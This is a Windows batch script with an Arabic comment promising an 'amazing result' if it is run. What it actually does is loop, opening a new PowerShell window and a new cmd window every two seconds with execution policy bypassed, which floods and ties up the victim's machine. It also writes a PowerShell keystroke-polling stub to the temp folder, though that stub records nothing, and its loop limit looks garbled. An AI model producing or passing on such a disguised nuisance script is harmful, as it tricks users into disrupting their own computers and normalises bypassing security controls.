::نص من تأليف عبد الرحمن قم بتشغيل هذا وسترى النتيجة الرائعة
@echo off
setlocal
set PS_SCRIPT_PATH=%TEMP%\DetectKeyPress.ps1
echo Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class KeyPress {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
    public static bool IsKeyPressed(int vKey) {
        return (GetAsyncKeyState(vKey) & 0x8000) != 0;
    }
}
"@ > %PS_SCRIPT_PATH%
set COUNT=0
:loop
if %COUNT% GEQ 99999999999 goto end
start powershell
start cmd
set /a COUNT+=1
timeout /t 2 /nobreak >nul
powershell -ExecutionPolicy Bypass -File %PS_SCRIPT_PATH%
goto loop

:end
del %PS_SCRIPT_PATH%
